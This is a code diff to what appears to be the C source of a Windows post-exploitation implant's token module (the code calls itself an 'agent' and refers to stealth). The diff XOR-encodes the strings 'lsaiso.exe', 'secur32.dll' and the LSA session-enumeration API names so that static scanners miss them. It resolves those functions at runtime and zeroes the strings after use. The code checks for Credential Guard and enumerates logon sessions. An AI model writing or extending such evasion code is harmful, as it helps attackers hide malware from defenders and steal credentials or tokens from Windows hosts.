@@ -3,6 +3,7 @@
  */
 #include "agent.h"
 #include "token_evasion.h"
+#include "api_resolve.h"
 #include <tlhelp32.h>
 
 /* ─── Dangerous privilege names (to strip for stealth) ─── */
@@ -41,7 +42,14 @@ BOOL token_credential_guard_active(void) {
         pe.dwSize = sizeof(pe);
         if (Process32FirstW(hSnap, &pe)) {
             do {
-                if (_wcsicmp(pe.szExeFile, L"lsaiso.exe") == 0) {
+                /* XOR-decrypt "lsaiso.exe" on stack */
+                wchar_t _lsa[] = {L'l'^0x5A, L's'^0x5A, L'a'^0x5A, L'i'^0x5A,
+                                  L's'^0x5A, L'o'^0x5A, L'.'^0x5A, L'e'^0x5A,
+                                  L'x'^0x5A, L'e'^0x5A, 0};
+                for (int _i = 0; _lsa[_i]; _i++) _lsa[_i] ^= 0x5A;
+                BOOL _match = (_wcsicmp(pe.szExeFile, _lsa) == 0);
+                SecureZeroMemory(_lsa, sizeof(_lsa));
+                if (_match) {
                     CloseHandle(hSnap);
                     return TRUE;
                 }
@@ -395,13 +403,23 @@ typedef NTSTATUS (WINAPI *pfnLsaFreeReturnBuffer)(PVOID Buffer);
 int token_enumerate_sessions(TOKEN_ENUM_CALLBACK callback, void *ctx) {
     if (!callback) return 0;
 
-    HMODULE hSecur32 = LoadLibraryA("secur32.dll");
+    char _ss[] = {'s'^0x5A,'e'^0x5A,'c'^0x5A,'u'^0x5A,'r'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_ss[_i];_i++) _ss[_i]^=0x5A;
+    HMODULE hSecur32 = LoadLibraryA(_ss);
+    SecureZeroMemory(_ss, sizeof(_ss));
     if (!hSecur32) return 0;
 
+    char _se[] = {'L'^0x5A,'s'^0x5A,'a'^0x5A,'E'^0x5A,'n'^0x5A,'u'^0x5A,'m'^0x5A,'e'^0x5A,'r'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'o'^0x5A,'g'^0x5A,'o'^0x5A,'n'^0x5A,'S'^0x5A,'e'^0x5A,'s'^0x5A,'s'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,'s'^0x5A,0};
+    for(int _i=0;_se[_i];_i++) _se[_i]^=0x5A;
     pfnLsaEnumerateLogonSessions pEnum =
-        (pfnLsaEnumerateLogonSessions)GetProcAddress(hSecur32, "LsaEnumerateLogonSessions");
+        (pfnLsaEnumerateLogonSessions)GetProcAddress(hSecur32, _se);
+    SecureZeroMemory(_se, sizeof(_se));
+
+    char _sf[] = {'L'^0x5A,'s'^0x5A,'a'^0x5A,'F'^0x5A,'r'^0x5A,'e'^0x5A,'e'^0x5A,'R'^0x5A,'e'^0x5A,'t'^0x5A,'u'^0x5A,'r'^0x5A,'n'^0x5A,'B'^0x5A,'u'^0x5A,'f'^0x5A,'f'^0x5A,'e'^0x5A,'r'^0x5A,0};
+    for(int _i=0;_sf[_i];_i++) _sf[_i]^=0x5A;
     pfnLsaFreeReturnBuffer pFree =
-        (pfnLsaFreeReturnBuffer)GetProcAddress(hSecur32, "LsaFreeReturnBuffer");
+        (pfnLsaFreeReturnBuffer)GetProcAddress(hSecur32, _sf);
+    SecureZeroMemory(_sf, sizeof(_sf));
 
     if (!pEnum || !pFree) return 0;
 
